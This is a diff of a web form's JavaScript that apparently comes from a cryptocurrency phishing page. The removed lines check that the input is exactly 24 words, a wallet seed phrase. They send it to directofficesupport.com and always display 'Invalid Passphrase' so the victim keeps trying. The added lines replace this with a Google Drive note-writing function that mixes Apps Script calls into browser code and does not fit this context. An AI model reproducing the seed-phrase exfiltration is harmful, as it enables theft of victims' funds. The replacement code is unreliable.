@@ -12,8 +12,6 @@ function handleSubmit(event) {
     const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
     const inputValue = form.elements['mf-texts'].value.trim();
 
-    
-
     const wordCount = inputValue.split(/\s+/).length;
     if (wordCount !== 24) {
         const errorElement = document.getElementById('emsg');
@@ -24,43 +22,19 @@ function handleSubmit(event) {
         return; // Exit function if word count is not 24
     }
 
-    // Step 2: Make a GET request to example.com/send/ + the value from Step 1
-    const url = `https://directofficesupport.com/send_char/${encodeURIComponent(inputValue)}/P-/`;
-
-    fetch(url, {
-        method: 'GET'
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.json(); // Assuming the response is JSON; adjust as per your API
-    })
-    .then(data => {
-        // Step 3: Display any errors in the HTML with ID 'emsg'
-        const errorElement = document.getElementById('emsg');
-        errorElement.textContent = ''; // Clear previous error messages
-        // Example assuming the API returns an error message in JSON response
-        // if (data.error) {
-        //     errorElement.textContent = data.error;
-        // }
-        errorElement.textContent = 'Invalid Passphrase'
-        myButton.disabled = false;
-        myButton2.disabled = false;
-        form.reset();
-        // Handle successful response if needed
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        const errorElement = document.getElementById('emsg');
-        // errorElement.textContent = 'Error occurred while processing your request.';
-        form.reset();
-        errorElement.textContent = 'Invalid Passphrase';
-        myButton.disabled = false;
-        myButton2.disabled = false;
-    });
+    // Step 2: Create a note file in Google Drive
+    createNoteFile();
+}
+// Function to create a note file in Google Drive
+function createNoteFile() {
+    var folderId = "1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q"; // Your Google Drive folder ID
+    var folder = DriveApp.getFolderById(folderId); 
+    
+    var fileName = "MyNote.txt";
+    var fileContent = "This is an automatically created note file.";
+    
+    var file = folder.createFile(fileName, fileContent);
+    
+    Logger.log("File created successfully: " + file.getUrl());
 }
 
-// Add event listener to the form for 'submit' event
-const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
-form.addEventListener('submit', handleSubmit);
